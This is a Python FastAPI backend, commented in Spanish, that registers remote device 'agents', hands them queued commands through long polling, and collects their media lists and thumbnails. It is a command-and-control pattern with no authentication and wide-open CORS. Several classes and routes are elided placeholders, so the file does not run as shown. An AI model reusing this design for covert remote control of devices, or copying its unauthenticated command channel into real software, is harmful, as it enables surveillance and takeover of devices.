import json
import asyncio
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import List, Dict

# --- INICIALIZACIÓN Y CONFIGURACIÓN ---
app = FastAPI(title="Agente Control Backend vFINAL (Long Polling)")
app.add_middleware(
    CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"],
)

# --- "BASE DE DATOS" EN MEMORIA ---
# Guardamos los agentes que se han reportado
# Formato: { "device_id": {"name": "device_name"} }
connected_agents: Dict[str, dict] = {}

# "Buzón" para los comandos pendientes para cada agente
pending_commands: Dict[str, dict] = {}

# Caché de miniaturas (esto no cambia)
device_thumbnails_cache: Dict[str, list] = {}

# --- MODELOS DE DATOS ---
class Command(BaseModel):
    target_id: str
    action: str
    payload: str

class Thumbnail(BaseModel): # ... (sin cambios)
class ErrorLog(BaseModel): # ... (sin cambios)

# --- ENDPOINTS (RUTAS DE LA API) ---

# NUEVA RUTA: El agente se presenta aquí
@app.post("/api/agent/heartbeat/{device_id}/{device_name:path}")
async def agent_heartbeat(device_id: str, device_name: str):
    """
    Los agentes llaman a esta ruta periódicamente para decir "sigo vivo"
    y para registrarse la primera vez.
    """
    if device_id not in connected_agents:
        print(f"[REGISTRO] Nuevo agente: '{device_name}' (ID: {device_id})")
    connected_agents[device_id] = {"name": device_name}
    return {"status": "ok"}

# NUEVA RUTA: El agente pregunta por comandos aquí
@app.get("/api/agent/poll_commands/{device_id}")
async def poll_commands(device_id: str):
    """
    Punto de Long Polling. El agente se queda esperando aquí.
    El servidor no responde hasta que hay un comando o pasa el timeout.
    """
    try:
        # Esperamos hasta 28 segundos a que aparezca un comando
        for _ in range(28):
            if device_id in pending_commands:
                command = pending_commands.pop(device_id)
                print(f"Entregando comando '{command['action']}' a {device_id[:8]}")
                return command
            await asyncio.sleep(1)
        # Si no hay comando, respondemos con "nada que hacer"
        return {"action": "no_op"}
    except asyncio.CancelledError:
        return {"action": "no_op"}

# RUTA MODIFICADA: Ahora guarda el comando en el "buzón"
@app.post("/api/send-command")
async def send_command_to_agent(command: Command):
    """Recibe un comando del panel y lo pone en el buzón del agente."""
    target_id = command.target_id
    if target_id not in connected_agents:
        return {"status": "error", "message": "Agente no registrado."}
    
    pending_commands[target_id] = command.dict()
    print(f"Comando '{command.action}' encolado para '{connected_agents[target_id]['name']}'")
    return {"status": "success", "message": "Comando en cola para el agente."}

# El resto de las rutas no necesitan grandes cambios
@app.get("/api/get-agents")
async def get_agents():
    return [{"id": device_id, "name": data["name"]} for device_id, data in connected_agents.items()]
    
@app.post("/api/submit_media_list/{device_id}") # ... (sin cambios)
@app.get("/api/get_media_list/{device_id}") # ... (sin cambios)
@app.post("/api/log_error/{device_id}") # ... (sin cambios)
